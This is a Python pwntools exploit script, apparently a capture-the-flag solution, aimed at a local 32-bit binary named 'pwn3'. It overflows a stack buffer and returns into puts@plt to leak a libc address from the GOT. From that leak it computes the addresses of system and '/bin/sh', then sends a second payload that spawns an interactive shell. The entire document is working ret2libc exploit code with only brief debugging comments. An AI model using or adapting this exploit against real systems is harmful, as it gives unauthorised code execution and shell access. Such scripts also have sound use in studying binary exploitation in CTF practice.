from pwn import *

p = process("./pwn3")
binary = ELF("pwn3")
libc = ELF("libc6_2.23-0ubuntu10_i386.so", checksec=False)
padding = 140 #0x80 + 0x4 is wrong , gdb is better
puts_plt = binary.symbols["plt.puts"]
main = binary.symbols["main"]
puts_got = binary.symbols["got.puts"]

#gdb.attach(p, """
#            b *main+91
#            c
#            """)

payload = ""
payload += "A" * padding
payload += p32(puts_plt)
payload += p32(main)
payload += p32(puts_got)

p.sendline(payload)
p.recvuntil("desert: \n")

libc_leak = u32(p.recv(4))
log.info("Puts libc : 0x{0:x}".format(libc_leak))
libc_base = libc_leak - libc.symbols["puts"]
log.info("Base libc : 0x{0:x}".format(libc_base))
libc_system = libc_base + libc.symbols["system"]
log.info("System libc : 0x{0:x}".format(libc_system))
libc_binsh = libc_base + libc.search("/bin/sh").next()
log.info("/bin/sh libc : 0x{0:x}".format(libc_binsh))

payload = ""
payload += "A" * (padding - 8) #wtf is going on, just debug it on gdb
payload += p32(libc_system)
payload += "JUNK"
payload += p32(libc_binsh)
p.sendline(payload)
p.interactive()
